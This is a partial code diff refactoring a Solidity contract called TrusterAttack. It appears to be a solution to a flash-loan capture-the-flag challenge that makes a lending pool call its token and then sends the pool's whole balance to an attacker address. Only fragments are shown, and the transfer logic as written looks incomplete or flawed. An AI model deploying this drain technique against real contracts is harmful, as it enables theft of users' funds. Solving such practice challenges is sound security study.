@@ -9,14 +9,13 @@ interface IPoolFunc {
         address borrower,
         address target,
         bytes calldata data
-    ) external;
+        ) external;
 }
 
 contract TrusterAttack {
-    using Address for address payable;
-    uint256 public balance;
-    constructor(address payable poolAddress,
-                 
+    using Address for address;
+    
+    constructor(address poolAddress,
                 address tokenAddress,
                 address attackerAddress
                 )
@@ -25,7 +24,7 @@ contract TrusterAttack {
 
         //call flashLoan with x borrowAmount, borrower = this
         //target = token 
-        balance = IERC20(tokenAddress).balanceOf(poolAddress);
+        uint256 balance = IERC20(tokenAddress).balanceOf(poolAddress);
         IPoolFunc(poolAddress).flashLoan(
             0,
             address(this),
@@ -43,7 +42,8 @@ contract TrusterAttack {
         //
     }
     function transferMe(address tokenAddress, address attackerAddress, address poolAddress) public{
-        IERC20(tokenAddress).transfer(attackerAddress, uint256(IERC20(tokenAddress).balanceOf(poolAddress)));
+        uint256 balance2 = IERC20(tokenAddress).balanceOf(poolAddress);
+        IERC20(tokenAddress).transfer(attackerAddress, balance2);
     }
 
    
